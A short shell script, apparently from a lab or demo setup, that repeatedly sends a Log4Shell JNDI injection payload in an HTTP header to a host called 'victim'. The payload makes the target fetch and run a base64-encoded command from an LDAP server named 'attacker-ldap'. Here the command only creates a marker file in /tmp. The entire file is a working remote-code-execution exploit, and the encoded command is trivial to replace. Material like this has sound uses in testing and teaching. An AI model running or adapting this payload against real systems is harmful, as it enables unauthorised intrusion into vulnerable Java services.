#!/bin/sh

while true; do
    sleep 5
    curl -s victim:8080 -H 'X-Api-Version:${jndi:ldap://attacker-ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg==}'
done